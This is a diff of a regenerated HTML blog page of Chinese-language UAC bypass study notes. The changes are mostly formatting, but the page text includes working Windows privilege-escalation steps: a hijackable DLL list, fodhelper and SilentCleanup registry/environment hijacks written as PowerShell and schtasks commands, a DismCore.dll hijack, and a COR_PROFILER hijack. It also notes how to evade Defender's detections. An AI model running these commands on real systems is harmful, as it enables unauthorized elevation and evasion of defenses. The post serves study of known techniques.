@@ -179,7 +179,7 @@
 <p>winsxs的dot-local为DLL劫持提供了更多的机会</p>
 <p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order">DLL搜索路径</a></p>
 <p>一些可劫持的exe和dll组合的统计：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">C:\windows\System32\sysprep\sysprep.exe</span><br><span class="line">C:\Windows\System32\Sysprep\SHCORE.dll</span><br><span class="line">C:\Windows\System32\Sysprep\OLEACC.DLL</span><br><span class="line"></span><br><span class="line">C:\windows\System32\cliconfg.exe</span><br><span class="line">C:\Windows\System32\NTWDBLIB.DLL</span><br><span class="line"></span><br><span class="line">C:\windows\System32\pwcreator.exe</span><br><span class="line">C:\Windows\System32\vds.exe</span><br><span class="line">C:\Program Files\Common Files\microsoft shared\ink\CRYPTBASE.dll</span><br><span class="line">C:\Program Files\Common Files\microsoft shared\ink\CRYPTSP.dll</span><br><span class="line">C:\Program Files\Common Files\microsoft shared\ink\dwmapi.dll</span><br><span class="line">C:\Program Files\Common Files\microsoft shared\ink\USERENV.dll</span><br><span class="line">C:\Program Files\Common Files\microsoft shared\ink\OLEACC.dll</span><br><span class="line"></span><br><span class="line">C:\windows\System32\cliconfg.exe</span><br><span class="line">C:\Windows\System32\NTWDBLIB.DLL</span><br><span class="line"></span><br><span class="line">C:\windows\System32\pwcreator.exe</span><br><span class="line">C:\Windows\System32\vds.exe</span><br><span class="line">C:\Windows\System32\UReFS.DLL</span><br><span class="line"></span><br><span class="line">C:\windows\ehome\Mcx2Prov.exe</span><br><span class="line">C:\Windows\ehome\CRYPTBASE.dll</span><br><span class="line"></span><br><span class="line">C:\windows\System32\sysprep\sysprep.exe</span><br><span class="line">C:\Windows\System32\sysprep\CRYPTSP.dll</span><br><span class="line">C:\windows\System32\sysprep\CRYPTBASE.dll</span><br><span class="line">C:\Windows\System32\sysprep\RpcRtRemote.dll</span><br><span class="line">C:\Windows\System32\sysprep\UxTheme.dll</span><br><span class="line"></span><br><span class="line">C:\windows\System32\cliconfg.exe</span><br><span class="line">C:\Windows\System32\NTWDBLIB.DLL</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">C:\windows\System32\sysprep\sysprep.exe</span><br><span class="line">C:\Windows\System32\Sysprep\SHCORE.dll</span><br><span class="line">C:\Windows\System32\Sysprep\OLEACC.DLL</span><br><span class="line"></span><br><span class="line">C:\windows\System32\cliconfg.exe</span><br><span class="line">C:\Windows\System32\NTWDBLIB.DLL</span><br><span class="line"></span><br><span class="line">C:\windows\System32\pwcreator.exe</span><br><span class="line">C:\Windows\System32\vds.exe</span><br><span class="line">C:\Program Files\Common Files\microsoft shared\ink\CRYPTBASE.dll</span><br><span class="line">C:\Program Files\Common Files\microsoft shared\ink\CRYPTSP.dll</span><br><span class="line">C:\Program Files\Common Files\microsoft shared\ink\dwmapi.dll</span><br><span class="line">C:\Program Files\Common Files\microsoft shared\ink\USERENV.dll</span><br><span class="line">C:\Program Files\Common Files\microsoft shared\ink\OLEACC.dll</span><br><span class="line"></span><br><span class="line">C:\windows\System32\cliconfg.exe</span><br><span class="line">C:\Windows\System32\NTWDBLIB.DLL</span><br><span class="line"></span><br><span class="line">C:\windows\System32\pwcreator.exe</span><br><span class="line">C:\Windows\System32\vds.exe</span><br><span class="line">C:\Windows\System32\UReFS.DLL</span><br><span class="line"></span><br><span class="line">C:\windows\ehome\Mcx2Prov.exe</span><br><span class="line">C:\Windows\ehome\CRYPTBASE.dll</span><br><span class="line"></span><br><span class="line">C:\windows\System32\sysprep\sysprep.exe</span><br><span class="line">C:\Windows\System32\sysprep\CRYPTSP.dll</span><br><span class="line">C:\windows\System32\sysprep\CRYPTBASE.dll</span><br><span class="line">C:\Windows\System32\sysprep\RpcRtRemote.dll</span><br><span class="line">C:\Windows\System32\sysprep\UxTheme.dll</span><br><span class="line"></span><br><span class="line">C:\windows\System32\cliconfg.exe</span><br><span class="line">C:\Windows\System32\NTWDBLIB.DLL</span><br></pre></td></tr></table></figure>
 <p>首先第一层防线是防止高权限移动文件。</p>
 <p>dll劫持一方面攻击者可能发现各种各样的新dll可以劫持，拦截特定路径下的特定dll不太好</p>
 <p>需要更好的办法</p>
@@ -282,7 +282,7 @@
 <p>有点像infamous Enigma0x3 "<strong><em>mscfile fileless</em></strong>" bypass，但利用的是不同的注册表和不同的程序。widely used ITW by malware。</p>
 <p>https://cqureacademy.com/cqure-labs/cqlabs-how-uac-bypass-methods-really-work-by-adrian-denkiewicz</p>
 <p>fodhelper.exe computerdefaults.exe 加载注册表中的 exe</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">New-Item &quot;HKCU:\Software\Classes\ms-settings\Shell\Open\command&quot; -Force</span><br><span class="line">New-ItemProperty -Path &quot;HKCU:\Software\Classes\ms-settings\Shell\Open\command&quot; -Name &quot;DelegateExecute&quot; -Value &quot;&quot; -Force</span><br><span class="line">Set-ItemProperty -Path &quot;HKCU:\Software\Classes\ms-settings\Shell\Open\command&quot; -Name &quot;(default)&quot; -Value cmd.exe -Force</span><br><span class="line">Start-Process &quot;C:\Windows\System32\fodhelper.exe&quot;</span><br><span class="line">Remove-Item &quot;HKCU:\Software\Classes\ms-settings\&quot; -Recurse -Force</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">New-Item &quot;HKCU:\Software\Classes\ms-settings\Shell\Open\command&quot; -Force</span><br><span class="line">New-ItemProperty -Path &quot;HKCU:\Software\Classes\ms-settings\Shell\Open\command&quot; -Name &quot;DelegateExecute&quot; -Value &quot;&quot; -Force</span><br><span class="line">Set-ItemProperty -Path &quot;HKCU:\Software\Classes\ms-settings\Shell\Open\command&quot; -Name &quot;(default)&quot; -Value cmd.exe -Force</span><br><span class="line">Start-Process &quot;C:\Windows\System32\fodhelper.exe&quot;</span><br><span class="line">Remove-Item &quot;HKCU:\Software\Classes\ms-settings\&quot; -Recurse -Force</span><br></pre></td></tr></table></figure>
 <p>https://devblogs.microsoft.com/oldnewthing/?p=14623</p>
 <p>其中#62就只是computerdefaults.exe触发</p>
 <p>WD的检测与绕过：</p>
@@ -307,7 +307,7 @@
 <p>20170515 <a target="_blank" rel="noopener" href="https://twitter.com/tiraniddo">James Forshaw</a> https://www.tiraniddo.dev/2017/05/exploiting-environment-variables-in.html</p>
 <p>https://cqureacademy.com/cqure-labs/cqlabs-how-uac-bypass-methods-really-work-by-adrian-denkiewicz</p>
 <p>*Microsoft会启动 %windir%.exe</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">New-ItemProperty &quot;HKCU:\Environment&quot; -Name &quot;windir&quot; -Value &quot;cmd.exe &#x2F;k cmd.exe&quot; -PropertyType String -Force</span><br><span class="line">schtasks.exe &#x2F;Run &#x2F;TN \Microsoft\Windows\DiskCleanup\SilentCleanup &#x2F;I</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">New-ItemProperty &quot;HKCU:\Environment&quot; -Name &quot;windir&quot; -Value &quot;cmd.exe /k cmd.exe&quot; -PropertyType String -Force</span><br><span class="line">schtasks.exe /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I</span><br></pre></td></tr></table></figure>
 <p>WD的检测：<em>schtaks.exe</em> 的命令行是否包含“Microsoft”，有则警报 （<strong>Behavior:Win32/SilentCleanupUACBypass</strong>）</p>
 <p>检查<strong>* 子串（</strong><em>PossibleSchedTasksUACBypass</em>** ）</p>
 <p>绕过：不用schtaks，用<strong><em>ITaskService</em></strong>, <strong><em>ITaskFolder</em></strong> and <strong><em>IRegisteredTask</em></strong> 接口自己去启动</p>
@@ -338,7 +338,7 @@
 <p>dism搜索<strong><em>dismcore.dll</em></strong> 的时候会先搜索system32文件夹，再搜索当前路径，然后找到。</p>
 <ol type="1">
 <li><p>创建<em>oemsetup.xml</em>文件，用来调用pkgmgr程序</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;unattend xmlns&#x3D;&quot;urn:schemas-microsoft-com:unattend&quot;&gt;</span><br><span class="line">&lt;servicing&gt;</span><br><span class="line">&lt;package action&#x3D;&quot;install&quot;&gt;</span><br><span class="line">&lt;assemblyIdentity name&#x3D;&quot;Package_1_for_KB929761&quot; version&#x3D;&quot;6.0.1.1&quot; language&#x3D;&quot;neutral&quot; processorArchitecture&#x3D;&quot;x86&quot; publicKeyToken&#x3D;&quot;31bf3856ad364e35&quot;&#x2F;&gt;</span><br><span class="line">&lt;source location&#x3D;&quot;%configsetroot%\Windows6.0-KB929761-x86.CAB&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;package&gt;</span><br><span class="line">&lt;&#x2F;servicing&gt;</span><br><span class="line">&lt;&#x2F;unattend&gt;</span><br></pre></td></tr></table></figure></li>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;unattend xmlns=&quot;urn:schemas-microsoft-com:unattend&quot;&gt;</span><br><span class="line">&lt;servicing&gt;</span><br><span class="line">&lt;package action=&quot;install&quot;&gt;</span><br><span class="line">&lt;assemblyIdentity name=&quot;Package_1_for_KB929761&quot; version=&quot;6.0.1.1&quot; language=&quot;neutral&quot; processorArchitecture=&quot;x86&quot; publicKeyToken=&quot;31bf3856ad364e35&quot;/&gt;</span><br><span class="line">&lt;source location=&quot;%configsetroot%\Windows6.0-KB929761-x86.CAB&quot; /&gt;</span><br><span class="line">&lt;/package&gt;</span><br><span class="line">&lt;/servicing&gt;</span><br><span class="line">&lt;/unattend&gt;</span><br></pre></td></tr></table></figure></li>
 <li><p>IFileOperation 移动DismCore.dll到<em>C:</em>.</p></li>
 <li><p><code>"C:\WINDOWS\system32\pkgmgr.exe" /n:C:\Users\&lt;user&gt;\AppData\Local\Temp\oemsetup.xml</code></p>
 <p>随后pkgmgr调用<code>"C:\WINDOWS\system32\dism.exe" /online /norestart /apply-unattend:"C:\Users\&lt;user&gt;\AppData\Local\Temp\oemsetup.xml"</code></p></li>
@@ -379,9 +379,9 @@
 <p>双击任一msc文件，通过Procmon监控发现最终运行的都是mmc.exe文件</p>
 <p>CLR(Common Language Runtime)，是微软为他们的.NET的虚拟机所选用的名称</p>
 <p>CLR会先检查环境变量中COR_ENABLE_PROFILING是否为1，若检查通过，则根据.NET版本不同，查找DLL位置的方法也不同，对于低于4.0的则去注册表中查找CLSID或ProgID项，找到其指定的dll文件路径。从.NET4.0版本开始则先查找环境变量COR_PROFILER_PATH是否指定dll文件路径，没有再去注册表中查找对应的CLSID项。所以这里我们就不设置COR_PROFILER_PATH了</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">COR_ENABLE_PROFILING &#x3D; 1</span><br><span class="line"></span><br><span class="line">COR_PROFILER&#x3D;&#123;CLSIDor ProgID&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">COR_ENABLE_PROFILING = 1</span><br><span class="line"></span><br><span class="line">COR_PROFILER=&#123;CLSIDor ProgID&#125;</span><br></pre></td></tr></table></figure>
 <p>找到HKEY_CURRENT_USER，分别添加以下新项：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;11111111-1111-1111-1111-111111111111&#125;和InprocServer32</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;11111111-1111-1111-1111-111111111111&#125;和InprocServer32</span><br></pre></td></tr></table></figure>
 <p>该dll中只负责运行cmd.exe，并退出主进程：现在我们尝试运行gpedit.msc，看能否运行管理员权限的cmd程序：</p>
 <p>WD：无法检测</p>
 <p>检测方法：检测环境变量。</p>
@@ -425,7 +425,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://wjk.moe/2020/UAC-bypass%E7%AC%94%E8%AE%B0/" data-id="ckmkpef7t000guktrerywfutb" class="article-share-link">Share</a>
+      <a data-url="https://wjk.moe/2020/UAC-bypass%E7%AC%94%E8%AE%B0/" data-id="cl8qok3gu0003vstr7sg0akil" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Windows/" rel="tag">Windows</a></li></ul>
@@ -506,15 +506,15 @@
       <ul>
         
           <li>
+            <a href="/2022/WebAssembly%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%B7%B7%E6%B7%86/">WebAssembly程序分析与混淆</a>
+          </li>
+        
+          <li>
             <a href="/2022/%E5%8F%8D%E7%BC%96%E8%AF%91-%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86-%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E4%B8%8E%E7%BC%96%E8%AF%91%E4%BC%98%E5%8C%96/">反编译-代码混淆-程序分析与编译优化</a>
           </li>
         
           <li>
-            <a href="/2022/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E4%B8%8E%E7%BC%96%E8%AF%91%E7%B3%BB%E7%BB%9F%E8%B5%9B/">编译原理中级修炼与备战编译系统赛</a>
-          </li>
-        
-          <li>
-            <a href="/2022/WebAssembly%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%B7%B7%E6%B7%86/">聊聊WebAssembly程序分析与混淆</a>
+            <a href="/2022/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E4%B8%8E%E7%BC%96%E8%AF%91%E7%B3%BB%E7%BB%9F%E8%B5%9B/">编译原理学习与编译系统赛</a>
           </li>
         
           <li>
@@ -522,7 +522,7 @@
           </li>
         
           <li>
-            <a href="/2022/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%BA%90%E5%88%86%E4%BA%AB/">静态分析学习资源分享</a>
+            <a href="/2022/NativeSummary/">NativeSummary：Java/C安卓应用无源码污点分析。</a>
           </li>
         
       </ul>
